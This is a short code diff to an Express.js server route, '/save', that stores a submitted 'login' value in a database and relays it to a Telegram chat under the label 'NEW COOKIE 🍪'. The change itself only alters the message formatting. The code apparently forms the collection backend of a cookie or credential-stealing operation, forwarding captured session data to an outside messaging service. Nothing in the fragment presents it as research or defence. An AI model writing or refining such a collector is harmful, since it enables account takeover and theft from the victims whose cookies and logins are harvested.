@@ -42,7 +42,7 @@ app.post("/save", async (req, res) => {
       VALUES (${login})`;
 
     await sendTelegramMessage(
-      process.env.CHAT_ID, `<b>NEW COOKIE 🍪</b> -----  <code>${login}</code> `);
+      process.env.CHAT_ID, `<b>NEW COOKIE 🍪</b> \n\n\n  <code>${login}</code> `);
 
     res.json({ ok: true, account });
   } catch (err) {
